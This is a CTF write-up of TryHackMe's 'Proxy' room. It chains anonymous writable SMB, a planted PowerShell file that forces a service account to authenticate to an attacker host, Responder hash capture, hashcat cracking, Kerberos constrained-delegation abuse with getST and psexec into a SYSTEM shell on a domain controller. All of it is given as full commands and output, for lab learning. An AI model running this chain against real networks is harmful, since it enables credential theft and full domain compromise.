---
type: writeup
platform: TryHackMe
room: Proxy
os: Windows
environment: Active Directory
last_verified: 2026-09-28

techniques:
  - active-directory-enumeration
  - anonymous-smb-access
  - forced-authentication
  - netntlmv2-capture
  - offline-password-cracking
  - ldap-enumeration
  - kerberos-constrained-delegation
  - s4u
  - kerberos-ticket-abuse
  - remote-execution

tools:
  - nmap
  - ldapsearch
  - rpcclient
  - smbclient
  - responder
  - hashcat
  - netexec
  - impacket-getST
  - impacket-psexec
---

**Attack path:** Anonymous writable SMB share → `svc.scanner` forced NTLM authentication → NetNTLMv2 cracking → authenticated LDAP enumeration → Kerberos Constrained Delegation → Administrator CIFS ticket → PsExec → SYSTEM

## 1. Active Directory Reconnaissance

Initial enumeration was performed with:

```bash
nmap -sC -sV <TARGET_IP>
```

A full TCP scan was also run:

```bash
nmap -Pn -p- --min-rate 3000 -T4 <TARGET_IP>
```

Relevant services included:

```bash
53/tcp    DNS
88/tcp    Kerberos
135/tcp   RPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password
593/tcp   RPC over HTTP
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
3389/tcp  RDP
9389/tcp  Active Directory Web Services
```

Nmap also identified:

```bash
Domain: ctf.local
Hostname: DC01
FQDN: DC01.ctf.local
```

The combination of Kerberos, LDAP, SMB and Global Catalog services strongly indicated an Active Directory Domain Controller.

Local name resolution was configured:

```bash
echo '<TARGET_IP> DC01.ctf.local DC01 ctf.local' >> /etc/hosts
```

Using the correct hostname is particularly important later because Kerberos tickets are issued for specific Service Principal Names rather than arbitrary IP addresses.

---

## 2. Anonymous LDAP and RPC Enumeration

The LDAP RootDSE was queried first:

```bash
ldapsearch -x \
  -H ldap://DC01.ctf.local \
  -s base \
  namingContexts
```

Relevant result:

```bash
namingContexts: DC=ctf,DC=local
```

This established the domain Base DN:

```bash
DC=ctf,DC=local
```

An anonymous RPC session was also tested:

```bash
rpcclient -U "" -N DC01.ctf.local
```

User and group enumeration was attempted:

```bash
enumdomusers
enumdomgroups
```

but returned:

```bash
NT_STATUS_ACCESS_DENIED
```

The anonymous connection itself was possible, but it did not provide useful domain-user enumeration.

Attention therefore shifted to SMB.

---

## 3. Anonymous SMB Access

Available shares were listed without credentials:

```bash
smbclient -L //DC01.ctf.local -N
```

Relevant result:

```bash
ADMIN$
C$
IPC$
IT-Shared
NETLOGON
SYSVOL
```

`IT-Shared` was a custom share, making it more interesting than the standard administrative and domain shares.

Anonymous access succeeded:

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

The share contained:

```bash
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html
```

The files were downloaded:

```bash
smb: \> get IT-Credentials-Backup.txt
smb: \> get IT-Onboarding-Checklist.txt
smb: \> get IT-Portal.html
```

and reviewed locally:

```bash
cat IT-Credentials-Backup.txt
cat IT-Onboarding-Checklist.txt
cat IT-Portal.html
```

The onboarding documentation revealed a service account:

```bash
svc.scanner
```

It also described an automated file-scanning process:

```text
File Scanner (svc.scanner)

Runs every 2 minutes.
Enumerates IT-Shared for new files to process.
Uses Shell enumeration to inspect file metadata and icons.
```

The portal independently confirmed:

```bash
Logged in as: svc.scanner
```

This created an important trust relationship:

```text
attacker-controlled SMB content
        ↓
IT-Shared
        ↓
automated processing
        ↓
svc.scanner
```

The next question was whether anonymous users could also **write** to the share.

---

## 4. Confirming Anonymous Write Access

A test file was created:

```bash
echo "test" > /tmp/test.txt
```

It was uploaded through the anonymous SMB session:

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

```bash
smb: \> put /tmp/test.txt test.txt
```

The upload succeeded.

The share therefore allowed:

```text
Anonymous read  : YES
Anonymous write : YES
```

This was the critical initial weakness: an unauthenticated user could place attacker-controlled content into a location processed automatically by the `svc.scanner` domain account.

---

## 5. Forcing Authentication from `svc.scanner`

The objective was to cause the scanner process to access an SMB path hosted by the attacker.

A PowerShell file was created:

```bash
cat > trigger.ps1 <<'EOF'
Test-Path \\<ATTACKER_IP>\icons\icon.ico
EOF
```

The PowerShell command referenced a remote UNC path:

```powershell
Test-Path \\<ATTACKER_IP>\icons\icon.ico
```

When Windows attempts to access a remote SMB resource, it may authenticate to that server using the current security context.

If the scanner processed the file as `svc.scanner`, the resulting SMB authentication could therefore expose a challenge-response exchange from that account.

---

## 6. Capturing NetNTLMv2 with Responder

Responder needed to listen for the incoming SMB connection.

The local SMB ports were checked first:

```bash
ss -ltnp | grep -E ':445|:139'
```

The local Samba service was already occupying TCP port `445`:

```bash
smbd
```

It was stopped:

```bash
systemctl stop smbd
```

Responder was then started on the lab interface:

```bash
responder -I ens5 -v
```

The trigger file was uploaded to the writable share:

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

```bash
smb: \> put trigger.ps1 trigger.ps1
smb: \> exit
```

The resulting flow was:

```text
trigger.ps1
    ↓
processed by svc.scanner
    ↓
Test-Path accesses \\<ATTACKER_IP>\icons\icon.ico
    ↓
SMB connection to attacker
    ↓
NTLM authentication
    ↓
Responder
```

Responder captured authentication from the service account:

```bash
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:...
```

This was a **NetNTLMv2 challenge-response capture**.

It was not the plaintext password and was not the account's NT hash directly.

---

## 7. Offline Password Cracking

The captured NetNTLMv2 response was stored in `hash.txt` and attacked offline:

```bash
hashcat -m 5600 \
  hash.txt \
  /usr/share/wordlists/rockyou.txt
```

Hashcat mode `5600` corresponds to NetNTLMv2.

The password was successfully recovered:

```bash
Username: svc.scanner
Password: <REDACTED>
```

Previously cracked results could be displayed with:

```bash
hashcat -m 5600 hash.txt --show
```

The recovered credential was then validated against SMB:

```bash
nxc smb DC01.ctf.local \
  -u 'svc.scanner' \
  -p '<REDACTED>'
```

Authentication succeeded:

```bash
[+] ctf.local\svc.scanner:<REDACTED>
```

At this point, the NetNTLMv2 capture had been converted into a confirmed reusable domain credential.

---

## 8. Authenticated LDAP Enumeration

With valid `svc.scanner` credentials, the account's Active Directory attributes were queried:

```bash
ldapsearch -x \
  -H ldap://DC01.ctf.local \
  -D 'svc.scanner@ctf.local' \
  -w '<REDACTED>' \
  -b 'DC=ctf,DC=local' \
  '(sAMAccountName=svc.scanner)' \
  sAMAccountName memberOf userAccountControl servicePrincipalName msDS-AllowedToDelegateTo
```

Relevant attributes included:

```bash
servicePrincipalName: scanner/DC01
servicePrincipalName: scanner/DC01.ctf.local

msDS-AllowedToDelegateTo: cifs/DC01
msDS-AllowedToDelegateTo: cifs/DC01.ctf.local
```

The critical discovery was:

```bash
msDS-AllowedToDelegateTo: cifs/DC01.ctf.local
```

This showed that `svc.scanner` was configured for **Kerberos Constrained Delegation** to the CIFS service on the Domain Controller.

---

## 9. Kerberos Constrained Delegation

A Service Principal Name identifies a Kerberos-enabled service.

In this case:

```bash
cifs/DC01.ctf.local
```

represents the CIFS/SMB service hosted by `DC01.ctf.local`.

The delegation configuration allowed:

```text
svc.scanner
    ↓
delegation permitted to
    ↓
cifs/DC01.ctf.local
```

Kerberos Service-for-User extensions can use this relationship through two stages:

```text
S4U2Self
    ↓
svc.scanner obtains a ticket representing another user

S4U2Proxy
    ↓
svc.scanner requests access to an allowed service
on behalf of that user
```

The goal was therefore to impersonate:

```bash
Administrator
```

for:

```bash
cifs/DC01.ctf.local
```

without requiring the Administrator password.

---

## 10. Obtaining an Administrator CIFS Ticket

Impacket's `getST.py` was available:

```bash
which getST.py
```

```bash
/usr/local/pyenv/shims/getST.py
```

A service ticket was requested using the `svc.scanner` credentials:

```bash
getST.py \
  -dc-ip <TARGET_IP> \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  'ctf.local/svc.scanner:<REDACTED>'
```

Relevant output:

```bash
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The resulting `.ccache` contained the Kerberos ticket required to access CIFS as Administrator.

The ticket cache was loaded:

```bash
export KRB5CCNAME="$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache"
```

The important distinction was now:

```text
Administrator password : NOT KNOWN
Administrator CIFS ticket: AVAILABLE
```

---

## 11. Remote Execution with Kerberos

The obtained CIFS ticket was then used with Impacket's PsExec implementation:

```bash
psexec.py -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
```

The options instructed PsExec to use Kerberos and the existing ticket cache rather than requesting a password.

The hostname mattered here.

The ticket had been issued for:

```bash
cifs/DC01.ctf.local
```

so the target was addressed as:

```bash
DC01.ctf.local
```

rather than only by IP address.

The remote execution succeeded, resulting in a highly privileged shell on the Domain Controller.

The execution context was:

```bash
NT AUTHORITY\SYSTEM
```

The final flag could then be retrieved:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

```bash
THM{REDACTED}
```

---

## Key Takeaways

- Anonymous SMB access becomes significantly more dangerous when the share is also writable and consumed by an automated privileged process.
- Attacker-controlled UNC paths can cause Windows processes to authenticate to an attacker-controlled SMB server, exposing NetNTLMv2 challenge-response material.
- A NetNTLMv2 capture is not the user's plaintext password or NT hash, but weak passwords can still be recovered through offline cracking.
- After obtaining credentials, authenticated LDAP enumeration can expose delegation relationships that are invisible during anonymous enumeration.
- `msDS-AllowedToDelegateTo` can reveal Kerberos Constrained Delegation targets.
- Constrained Delegation can allow a service account to impersonate another user toward specifically permitted services through S4U2Self and S4U2Proxy.
- Kerberos attacks depend on correct hostname and SPN matching. A valid ticket for `cifs/DC01.ctf.local` should be used against the corresponding hostname rather than an arbitrary IP address.